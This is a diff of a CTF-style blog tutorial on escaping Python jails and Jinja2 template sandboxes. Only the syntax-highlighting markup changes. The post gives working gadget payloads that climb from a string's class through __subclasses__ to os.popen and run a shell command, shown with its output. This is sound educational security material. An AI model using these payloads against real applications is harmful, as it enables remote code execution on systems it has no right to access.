@@ -4,14 +4,14 @@ Here is a cool video explanation by @pwnfunction on server side template
 injection wherein he mentions a way to &ldquo;gadget&rdquo; our way out of Flask&rsquo;s Jinja2 backend to get remote code execution.
 Here&rsquo;s the gist of it:'><meta name=author content><link rel="preload stylesheet" as=style href=https://lavafroth.is-a.dev/app.min.css><link rel=preload as=image href=../../header.svg><link as=font href=https://lavafroth.is-a.dev/latinmodern-math.otf><link rel=preload as=image href=https://lavafroth.is-a.dev/github.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/about.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/art.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/rss.svg><link rel=icon href=https://lavafroth.is-a.dev/favicon.svg></head><body><header><a class=site-name href=https://lavafroth.is-a.dev/ aria-label=Home><svg viewBox="0 0 8790 2080"><path d="M80 1935V465h216v1270h286v2e2zm853 0 222-1470h264l222 1470h-210l-40-3e2h-208l-40 3e2zm280-528h148l-62-494-6-78h-12l-6 78zm1025 528L2014 465h210l108 868 8 142h12l8-142 108-868h210l-224 1470zm813 0 222-1470h264l222 1470h-210l-40-3e2h-208l-40 3e2zm280-528h148l-62-494-6-78h-12l-6 78zm851 528V465h514v222h-298v386h2e2v222h-2e2v640zm910 0V465h216q194 0 286 108 92 107 92 316 0 124-43 215-44 90-106 132l147 699h-216l-122-620h-38v620zm216-820q60 0 95-26 35-27 50-76t15-116q0-105-34-161-35-57-126-57zm1084 836q-90 0-154-42-65-42-99-114-35-72-35-162V767q0-91 35-162 34-72 99-114 64-42 154-42t155 42q64 42 99 114 34 72 34 162v866q0 90-34 162-35 72-99 114-65 42-155 42zm0-210q40 0 56-33 16-34 16-75V767q0-41-17-74-17-34-55-34-37 0-54 34-18 33-18 74v866q0 41 17 75 17 33 55 33zm890 194V687h-204V465h624v222h-204v1248zm828 0V465h216v608h168V465h216v1470h-216v-640h-168v640z"/></svg></a><nav><a style=--url:url(./github.svg) href=https://github.com/lavafroth aria-label=github target=_blank></a><a href=../../about/ aria-label=about style=--url:url(./about.svg)></a><a href=../../art/ aria-label=art style=--url:url(./art.svg)></a><a href=../../index.xml aria-label=rss style=--url:url(./rss.svg)></a><nav></header><main><hgroup data-pagefind-body><p data-pagefind-ignore><time>Dec 9, 2021 | 3 minutes read</time></p><h1 data-pagefind-meta=title>Gadgeting in Python Jails</h1></hgroup><section class=post-content data-pagefind-body><p>We&rsquo;ve all been there. That one CTF that wants to test your object oriented skills by confining you to a python jail.
 Additionally some might even keep <code>builtins</code> and <code>eval</code> out of reach.</p><p><a href="https://www.youtube.com/watch?v=SN6EVIG4c-0">Here</a> is a cool video explanation by @pwnfunction on server side template
-injection wherein he mentions a way to &ldquo;gadget&rdquo; our way out of Flask&rsquo;s Jinja2 backend to get remote code execution.</p><p>Here&rsquo;s the gist of it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>__base__
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>__subclasses__()[<span style=color:#ae81ff>141</span>]
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;sys&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#39;os&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;id&#39;</span>)
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>read()
+injection wherein he mentions a way to &ldquo;gadget&rdquo; our way out of Flask&rsquo;s Jinja2 backend to get remote code execution.</p><p>Here&rsquo;s the gist of it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>__base__</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>141</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=fm>__init__</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;sys&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>modules</span><span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>read</span><span class=p>()</span>
 </span></span></code></pre></div><p>First, we get the class of the string, that is, the <code>str</code> class.
 In python&rsquo;s object oriented world, every object inherits from the base class called <code>object</code>.
 Here, we access that using the <code>__base__</code> magic (dunder) attribute.
@@ -24,86 +24,86 @@ itself. After accessing the <code>os</code> module, we can invoke its methods. H
 AttributeError: &#39;wrapper_descriptor&#39; object has no attribute &#39;__globals__&#39;
 </code></pre><p><em>What!? Does it not work?</em></p><p>I noticed a similar behavior in CTFs that had python jails. It turns out that the index of the <code>warnings.catch_warnings</code>
 class varies from one version to the other in python. A better idea would be if we dynamically picked the class from
-the <code>''.__class__.__base__.__subclasses__()</code> list instead of hardcoding the index as <code>141</code>.</p><p>We can modify the gadget like so:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span>next(
-</span></span><span style=display:flex><span>  filter(
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>lambda</span> x: <span style=color:#e6db74>&#39;catch_warnings&#39;</span> <span style=color:#f92672>==</span> x<span style=color:#f92672>.</span>__name__,
-</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__base__<span style=color:#f92672>.</span>__subclasses__()
-</span></span><span style=display:flex><span>  )
-</span></span><span style=display:flex><span>)<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;sys&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#39;os&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;id&#39;</span>)<span style=color:#f92672>.</span>read()
+the <code>''.__class__.__base__.__subclasses__()</code> list instead of hardcoding the index as <code>141</code>.</p><p>We can modify the gadget like so:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>next</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>  <span class=nb>filter</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=s1>&#39;catch_warnings&#39;</span> <span class=o>==</span> <span class=n>x</span><span class=o>.</span><span class=vm>__name__</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>__base__</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>  <span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>)</span><span class=o>.</span><span class=fm>__init__</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;sys&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>modules</span><span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
 </span></span></code></pre></div><p>which results in the following:</p><pre tabindex=0><code>uid=1000(h) gid=1000(h) groups=1000(h),970(docker),998(wheel)
 </code></pre><p>This solves the problem but what do we do when the jail restricts access to <code>warnings.catch_warnings</code>?</p><p>Expanding upon the aforementioned idea, we can look for other subclasses which make use of <code>sys</code>
-by running the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span>names <span style=color:#f92672>=</span> list()
-</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__base__<span style=color:#f92672>.</span>__subclasses__():
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> hasattr(x<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>, <span style=color:#e6db74>&#39;__globals__&#39;</span>)
-</span></span><span style=display:flex><span>	<span style=color:#f92672>and</span> x<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span><span style=color:#f92672>.</span>__globals__<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;sys&#39;</span>):
-</span></span><span style=display:flex><span>		names<span style=color:#f92672>.</span>append(x<span style=color:#f92672>.</span>__name__)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pprint <span style=color:#f92672>import</span> pprint
-</span></span><span style=display:flex><span>pprint(names)
-</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span>[<span style=color:#e6db74>&#39;_ModuleLock&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;_DummyModuleLock&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;_ModuleLockManager&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;ModuleSpec&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;FileLoader&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;_NamespacePath&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;_NamespaceLoader&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;FileFinder&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;zipimporter&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;_ZipImportResourceReader&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;IncrementalEncoder&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;IncrementalDecoder&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;StreamReaderWriter&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;StreamRecoder&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;_wrap_close&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;Quitter&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;_Printer&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;WarningMessage&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;catch_warnings&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;_GeneratorContextManagerBase&#39;</span>,
-</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;_BaseExitStack&#39;</span>]
+by running the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>names</span> <span class=o>=</span> <span class=nb>list</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>__base__</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nb>hasattr</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=fm>__init__</span><span class=p>,</span> <span class=s1>&#39;__globals__&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=ow>and</span> <span class=n>x</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;sys&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>		<span class=n>names</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pprint</span> <span class=kn>import</span> <span class=n>pprint</span>
+</span></span><span class=line><span class=cl><span class=n>pprint</span><span class=p>(</span><span class=n>names</span><span class=p>)</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=s1>&#39;_ModuleLock&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;_DummyModuleLock&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;_ModuleLockManager&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;ModuleSpec&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;FileLoader&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;_NamespacePath&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;_NamespaceLoader&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;FileFinder&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;zipimporter&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;_ZipImportResourceReader&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;IncrementalEncoder&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;IncrementalDecoder&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;StreamReaderWriter&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;StreamRecoder&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;_wrap_close&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;Quitter&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;_Printer&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;WarningMessage&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;catch_warnings&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;_GeneratorContextManagerBase&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> <span class=s1>&#39;_BaseExitStack&#39;</span><span class=p>]</span>
 </span></span></code></pre></div><p>Now that we have potential subclasses to latch onto, we can weaponize this.</p><p>The initial plan was to look for any of the above subclasses in the list, get a handle to one
-of them, thereby executing the system commands.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span>next(
-</span></span><span style=display:flex><span>  filter(
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>lambda</span> x: x<span style=color:#f92672>.</span>__name__ <span style=color:#f92672>in</span> [
-</span></span><span style=display:flex><span>			<span style=color:#e6db74>&#39;_ModuleLock&#39;</span>, <span style=color:#e6db74>&#39;_DummyModuleLock&#39;</span>,
-</span></span><span style=display:flex><span> 			<span style=color:#e6db74>&#39;_ModuleLockManager&#39;</span>, <span style=color:#e6db74>&#39;ModuleSpec&#39;</span>,
-</span></span><span style=display:flex><span> 			<span style=color:#e6db74>&#39;FileLoader&#39;</span>, <span style=color:#e6db74>&#39;_NamespacePath&#39;</span>,
-</span></span><span style=display:flex><span> 			<span style=color:#e6db74>&#39;_NamespaceLoader&#39;</span>, <span style=color:#e6db74>&#39;FileFinder&#39;</span>,
-</span></span><span style=display:flex><span> 			<span style=color:#e6db74>&#39;zipimporter&#39;</span>, <span style=color:#e6db74>&#39;_ZipImportResourceReader&#39;</span>,
-</span></span><span style=display:flex><span> 			<span style=color:#e6db74>&#39;IncrementalEncoder&#39;</span>, <span style=color:#e6db74>&#39;IncrementalDecoder&#39;</span>,
-</span></span><span style=display:flex><span> 			<span style=color:#e6db74>&#39;StreamReaderWriter&#39;</span>, <span style=color:#e6db74>&#39;StreamRecoder&#39;</span>,
-</span></span><span style=display:flex><span> 			<span style=color:#e6db74>&#39;_wrap_close&#39;</span>,<span style=color:#e6db74>&#39;Quitter&#39;</span>,
-</span></span><span style=display:flex><span> 			<span style=color:#e6db74>&#39;_Printer&#39;</span>, <span style=color:#e6db74>&#39;WarningMessage&#39;</span>,
-</span></span><span style=display:flex><span> 			<span style=color:#e6db74>&#39;catch_warnings&#39;</span>,
-</span></span><span style=display:flex><span>			<span style=color:#e6db74>&#39;_GeneratorContextManagerBase&#39;</span>,
-</span></span><span style=display:flex><span> 			<span style=color:#e6db74>&#39;_BaseExitStack&#39;</span>],
-</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__base__<span style=color:#f92672>.</span>__subclasses__()
-</span></span><span style=display:flex><span>  )
-</span></span><span style=display:flex><span>)<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;sys&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#39;os&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;id&#39;</span>)<span style=color:#f92672>.</span>read()
-</span></span></code></pre></div><p>However, it would be better if we did not hardcode the values.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span>next(
-</span></span><span style=display:flex><span>	filter(
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>lambda</span> x:
-</span></span><span style=display:flex><span>			hasattr(
-</span></span><span style=display:flex><span>				x<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>,
-</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#39;__globals__&#39;</span>
-</span></span><span style=display:flex><span>			)
-</span></span><span style=display:flex><span>			<span style=color:#f92672>and</span> x<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>
-</span></span><span style=display:flex><span>			<span style=color:#f92672>.</span>__globals__
-</span></span><span style=display:flex><span>			<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;sys&#39;</span>),
-</span></span><span style=display:flex><span>			<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__
-</span></span><span style=display:flex><span>			<span style=color:#f92672>.</span>__base__
-</span></span><span style=display:flex><span>			<span style=color:#f92672>.</span>__subclasses__()
-</span></span><span style=display:flex><span>	)
-</span></span><span style=display:flex><span>)<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;sys&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#39;os&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;id&#39;</span>)<span style=color:#f92672>.</span>read()
+of them, thereby executing the system commands.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>next</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>  <span class=nb>filter</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>x</span><span class=o>.</span><span class=vm>__name__</span> <span class=ow>in</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>			<span class=s1>&#39;_ModuleLock&#39;</span><span class=p>,</span> <span class=s1>&#39;_DummyModuleLock&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> 			<span class=s1>&#39;_ModuleLockManager&#39;</span><span class=p>,</span> <span class=s1>&#39;ModuleSpec&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> 			<span class=s1>&#39;FileLoader&#39;</span><span class=p>,</span> <span class=s1>&#39;_NamespacePath&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> 			<span class=s1>&#39;_NamespaceLoader&#39;</span><span class=p>,</span> <span class=s1>&#39;FileFinder&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> 			<span class=s1>&#39;zipimporter&#39;</span><span class=p>,</span> <span class=s1>&#39;_ZipImportResourceReader&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> 			<span class=s1>&#39;IncrementalEncoder&#39;</span><span class=p>,</span> <span class=s1>&#39;IncrementalDecoder&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> 			<span class=s1>&#39;StreamReaderWriter&#39;</span><span class=p>,</span> <span class=s1>&#39;StreamRecoder&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> 			<span class=s1>&#39;_wrap_close&#39;</span><span class=p>,</span><span class=s1>&#39;Quitter&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> 			<span class=s1>&#39;_Printer&#39;</span><span class=p>,</span> <span class=s1>&#39;WarningMessage&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> 			<span class=s1>&#39;catch_warnings&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>			<span class=s1>&#39;_GeneratorContextManagerBase&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl> 			<span class=s1>&#39;_BaseExitStack&#39;</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>__base__</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>  <span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>)</span><span class=o>.</span><span class=fm>__init__</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;sys&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>modules</span><span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span></code></pre></div><p>However, it would be better if we did not hardcode the values.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>next</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>	<span class=nb>filter</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>		<span class=k>lambda</span> <span class=n>x</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>			<span class=nb>hasattr</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>				<span class=n>x</span><span class=o>.</span><span class=fm>__init__</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>				<span class=s1>&#39;__globals__&#39;</span>
+</span></span><span class=line><span class=cl>			<span class=p>)</span>
+</span></span><span class=line><span class=cl>			<span class=ow>and</span> <span class=n>x</span><span class=o>.</span><span class=fm>__init__</span>
+</span></span><span class=line><span class=cl>			<span class=o>.</span><span class=vm>__globals__</span>
+</span></span><span class=line><span class=cl>			<span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;sys&#39;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>			<span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span>
+</span></span><span class=line><span class=cl>			<span class=o>.</span><span class=n>__base__</span>
+</span></span><span class=line><span class=cl>			<span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>	<span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>)</span><span class=o>.</span><span class=fm>__init__</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;sys&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>modules</span><span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
 </span></span></code></pre></div><p>There you have it! This payload will work as long as there is at least one subclass in the subclasses list
 which makes use of <code>sys</code>. With that, our object oriented quest has come to an end.</p><p>Thanks for giving this a read!</p></section><footer class=post-tags data-pagefind-meta=tags><a href=https://lavafroth.is-a.dev/tags/python class=list-tag>Python</a>
 <a href=https://lavafroth.is-a.dev/tags/sandbox-escape class=list-tag>Sandbox Escape</a></footer><nav data-post><a href=https://lavafroth.is-a.dev/post/picoctf-web-challenge-notepad/><span>←</span><span>Notepad</span></a><br></nav></main><footer class=footer><p>&copy; 2026 <a href=https://lavafroth.is-a.dev/>lavafroth</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/issues/new/choose>Report an issue</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/discussions/>Discuss</a></p><p><a href=https://lavafroth.is-a.dev/privacy>Privacy</a></p><p><a href=https://creativecommons.org/licenses/by-sa/4.0/legalcode>License</a></p></footer></body></html>
